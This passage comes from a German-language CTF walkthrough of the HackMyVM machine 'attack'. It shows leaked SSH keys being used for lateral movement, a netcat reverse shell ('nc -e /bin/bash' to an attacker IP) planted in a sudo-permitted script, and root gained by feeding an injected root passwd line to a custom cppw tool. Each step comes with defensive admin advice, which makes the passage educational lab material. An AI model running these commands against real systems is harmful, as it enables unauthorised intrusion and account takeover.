+  inflating: id_rsa</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">cat id_rsa</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+[...] <span class="comment"><!-- Schlüssel für teste --></span>
+-----END OPENSSH PRIVATE KEY-----
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine weitere Datei (`filexxx.zip`) wird auf dem Webserver entdeckt und heruntergeladen. Das Entpacken ergibt einen privaten SSH-Schlüssel (`id_rsa`). Der Inhalt dieses Schlüssels entspricht dem öffentlichen Schlüssel, der zuvor in der `authorized_keys`-Datei von `teste` gefunden wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der private SSH-Schlüssel für den Benutzer `teste` wurde öffentlich auf dem Webserver abgelegt! Dies ist ein schwerwiegendes Sicherheitsleck, hätte aber auch für den initialen Zugriff genutzt werden können (statt des FTP-Weges).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Fund bestätigt den Zugriff auf `teste`, der aber bereits erreicht wurde.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals private Schlüssel in öffentlich zugänglichen Bereichen! Überprüfen Sie alle Webserver-Inhalte auf sensible Daten.</p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">curl http://192.168.2.100//jackobattack.txt --output jackobattack.txt</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">cat jackobattack.txt</span></div>
+                     <pre>
+Hey jackob, you will need this:
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+[...] <span class="comment"><!-- Schlüssel für jackob --></span>
+-----END OPENSSH PRIVATE KEY-----
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Noch eine Datei (`jackobattack.txt`) wird vom Webserver heruntergeladen. Sie enthält eine Nachricht an `jackob` und einen weiteren privaten SSH-Schlüssel.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Kritisches Datenleck! Der private SSH-Schlüssel für den Benutzer `jackob` wurde ebenfalls öffentlich zugänglich gemacht.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diesen privaten Schlüssel, um sich per SSH als Benutzer `jackob` anzumelden (Lateral Movement).<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals private Schlüssel in öffentlich zugänglichen Bereichen! Schulen Sie Benutzer im sicheren Umgang mit Schlüsseln.</p>
+
+        </section>
+
+        <section id="lateral-movement-jackob">
+             <h2>Lateral Movement (zu jackob)</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">vi rsa</span></div> <span class="comment"><!-- Speichert Jackobs Schlüssel --></span>
+                     <pre>[Datei 'rsa' mit Jackobs Private Key erstellt/gespeichert]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">ssh jackob@attack.hmv -i rsa</span></div>
+                    <pre>
+[...]
+<span class="prompt" style="color: yellow;">jackob@attack:~$</span>
+</pre>
+                </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Der in `jackobattack.txt` gefundene private Schlüssel wird in der Datei `rsa` gespeichert. Anschließend wird `ssh` verwendet, um sich mit diesem Schlüssel als Benutzer `jackob` anzumelden.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiches Lateral Movement! Der Angreifer hat nun eine Shell als Benutzer `jackob`.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumerationsschritte als `jackob` durch, insbesondere `sudo -l`.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die kompromittierten Schlüssel vom Webserver und aus den `authorized_keys`-Dateien. Erneuern Sie alle betroffenen Schlüssel.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">jackob@attack:~$</span> <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for jackob on attack:
+    !env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jackob may run the following commands on attack:
+    <span class="password">(kratos) NOPASSWD: /home/jackob/attack.sh</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` als `jackob` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Fund! `jackob` darf das Skript `/home/jackob/attack.sh` als Benutzer `kratos` ohne Passwort (`NOPASSWD`) ausführen. Dies ist ein klarer Pfad zur Privilegienerweiterung zu `kratos`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `jackob` das Skript `/home/jackob/attack.sh` selbst besitzt und ändern kann, ersetzen Sie den Inhalt des Skripts durch einen Befehl, der eine Shell startet (z.B. `/bin/bash` oder eine Reverse Shell). Führen Sie dann das Skript mit `sudo -u kratos /home/jackob/attack.sh` aus.<br><strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem unsicher. Erlauben Sie niemals Benutzern, Skripte auszuführen, die sie selbst ändern können, insbesondere nicht als andere Benutzer via `sudo`. Verwenden Sie spezifischere, sicherere Befehle in `sudo`-Regeln.</p>
+        </section>
+
+        <section id="privesc-kratos-poc">
+            <h2>Privilege Escalation (jackob zu kratos - POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung der `sudo`-Regel, die es `jackob` erlaubt, `/home/jackob/attack.sh` als `kratos` auszuführen, um eine Shell als `kratos` zu erlangen.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Shell-Zugriff als `jackob`.
+                 *   Die spezifische `sudo`-Regel `(kratos) NOPASSWD: /home/jackob/attack.sh`.
+                 *   Ein Angreifer-System mit Netcat-Listener.
+             </p>
+             <p class="recommendation"><strong>Risiko:</strong> Hoch. Ermöglicht die Übernahme des `kratos`-Kontos.</p>
+
+            <p class="analysis"><strong>Schritt 1: Skript manipulieren</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">jackob@attack:~$</span> <span class="command">mv attack.sh attack.bak</span></div>
+                     <div class="prompt" style="color: yellow;">jackob@attack:~$</span> <span class="command">vi attack.sh</span></div>
+                     <div class="prompt" style="color: yellow;">jackob@attack:~$</span> <span class="command">cat attack.sh</span></div>
+                    <pre>
+#!/bin/bash
+
+<span class="command">nc -e /bin/bash 192.168.2.121 4444</span> <span class="comment"><!-- Reverse Shell Payload --></span>
+</pre>
+                     <div class="prompt" style="color: yellow;">jackob@attack:~$</span> <span class="command">chmod +x attack.sh</span></div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das ursprüngliche `attack.sh` wird gesichert. Ein neues `attack.sh` wird erstellt, das einen Netcat-Reverse-Shell-Befehl enthält, der sich zur Angreifer-IP `192.168.2.121` auf Port `4444` verbinden soll. Das Skript wird ausführbar gemacht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript ist nun präpariert, um bei Ausführung eine Reverse Shell zu senden.</p>
+
+             <p class="analysis"><strong>Schritt 2: Listener starten (Angreifer)</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Listener auf Port 4444 gestartet.</p>
+
+            <p class="analysis"><strong>Schritt 3: Manipuliertes Skript als kratos ausführen</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">jackob@attack:~$</span> <span class="command">sudo -u kratos /home/jackob/attack.sh</span></div>
+                     <pre>[Keine direkte Ausgabe, die Shell wird zum Listener gesendet]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `jackob` führt das manipulierte Skript mithilfe seiner `sudo`-Berechtigung als Benutzer `kratos` aus.</p>
+
+            <p class="analysis"><strong>Schritt 4: Shell als kratos empfangen (Angreifer)</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Fortsetzung der Listener-Ausgabe -->
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.109] 51320</span> <span class="comment"><!-- Ziel-IP hier 109 statt 100? Möglicher Log-Fehler --></span>
+<span class="prompt" style="color: yellow;">kratos@attack:/home/jackob$</span> <span class="command">pwd</span>
+<span class="command">/home/jackob</span>
+<span class="prompt" style="color: yellow;">kratos@attack:/home/jackob$</span> <span class="command">id</span>
+<span class="command">uid=1002(kratos) gid=1002(kratos) groups=1002(kratos)</span>
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Ergebnis:</strong> Der Listener empfängt die Verbindung und stellt eine Shell als Benutzer `kratos` bereit.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Privilegienerweiterung von `jackob` zu `kratos` war erfolgreich durch Ausnutzung der unsicheren `sudo`-Regel.</p>
+             <p class="recommendation"><strong>Empfehlung (Admin):</strong> Entfernen Sie die gefährliche `sudo`-Regel. Überprüfen Sie alle `sudo`-Konfigurationen auf ähnliche Schwachstellen.</p>
+        </section>
+
+         <section id="privesc-root-poc">
+            <h2>Privilege Escalation (kratos zu root - POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung eines unbekannten (nicht standardmäßigen) SUID-Programms oder einer `sudo`-Regel (nicht im Log gezeigt), um von `kratos` zu `root` zu eskalieren.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Shell-Zugriff als `kratos`.
+                 *   Existenz des Tools `/usr/sbin/cppw` (vermutlich ein benutzerdefiniertes Tool zum Setzen von Passwörtern aus einer Datei) und die Berechtigung für `kratos`, dieses via `sudo` auszuführen (diese Berechtigung wird hier angenommen, ist aber nicht durch `sudo -l` belegt).
+                 *   Ein bekannter Root-Passwort-Hash oder die Möglichkeit, einen zu generieren und ein entsprechendes Passwort zu wählen.
+             </p>
+              <p class="recommendation"><strong>Risiko:</strong> Kritisch. Ermöglicht die vollständige Übernahme des Systems.</p>
+
+             <p class="analysis"><strong>Schritt 1: Passwortdatei erstellen</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">kratos@attack:/home/jackob$</span> <span class="command">cd /home/kratos/</span></div>
+                    <div class="prompt" style="color: yellow;">kratos@attack:/home/kratos$</span> <span class="command">echo 'root:<span class="password">$6$UG5u1zQ6CA0YdHfM$ZF0sy5XsDSvr2Qcow4mpujxPd0KvaFWdNrd9Yg61T4mKPI.JCkfQ1nC6tZx52OqPfrUorkd.kc5nmIm2DK9vt.</span>:0:0:root:/root:/usr/bin/bash' > password_file</span></div>
+                     <div class="prompt" style="color: yellow;">kratos@attack:/home/kratos$</span> <span class="command">chmod +x password_file</span></div> <span class="comment"><!-- chmod ist hier unnötig --></span>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Datei namens `password_file` wird erstellt. Sie enthält eine Zeile im Format, das `/etc/passwd` ähnelt, definiert einen Benutzer `root` mit UID/GID 0 und einem SHA512-Crypt-Hash (`$6$`). Das Passwort für diesen Hash ist unbekannt, muss aber dem Angreifer bekannt sein oder von ihm gewählt worden sein.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei ist vorbereitet, um sie einem Passwortänderungs-Tool zu übergeben.</p>
+
+            <p class="analysis"><strong>Schritt 2: Passwortänderungs-Tool ausführen</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">kratos@attack:/home/kratos$</span> <span class="command">sudo /usr/sbin/cppw password_file</span></div>
+                     <pre>[Keine Ausgabe, aber der Befehl wird ausgeführt]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das (vermutlich benutzerdefinierte) Tool `/usr/sbin/cppw` wird mit `sudo` ausgeführt, wobei die erstellte `password_file` als Argument übergeben wird. Es wird angenommen, dass `kratos` die `sudo`-Berechtigung für `cppw` hat und dass `cppw` das Root-Passwort basierend auf dem Inhalt der Datei ändert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt der Eskalation. Das Root-Passwort wird auf ein dem Angreifer bekanntes Passwort gesetzt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie nun mit `su` und dem bekannten Passwort zum Root-Benutzer.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie das unsichere `cppw`-Tool oder die entsprechende `sudo`-Berechtigung. Verwenden Sie Standard-Tools zur Passwortverwaltung (`passwd`).</p>
+
+            <p class="analysis"><strong>Schritt 3: Zu Root wechseln</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">kratos@attack:/home/kratos$</span> <span class="command">su</span></div>
+                    <pre>Password: <span class="password">[Passwort für den Hash aus password_file eingegeben]</span>
+<span class="prompt" style="color: red;">root@attack:/home/kratos#</span> <span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `su`-Befehl wird verwendet, um zum Root-Benutzer zu wechseln. Das Passwort, das dem Hash in `password_file` entspricht, wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Eine Root-Shell wurde erlangt.</p>
+
+             <p class="analysis"><strong>Schritt 4: Root-Flag lesen</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">root@attack:/home/kratos#</span> <span class="command">cd /root</span></div>
+                     <div class="prompt" style="color: red;">root@attack:~#</span> <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">HMVattackr00t</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Root-Flag wird aus `/root/root.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ziel erreicht.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">User Flag (teste/jackob - nicht explizit gelesen, aus Log-Ende extrahiert)</div>
+                     <div class="flag-value"><span class="password">HMVattackstarted</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMVattackr00t</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2. November 2022</p>
+    </footer>
+</body>
+</html>
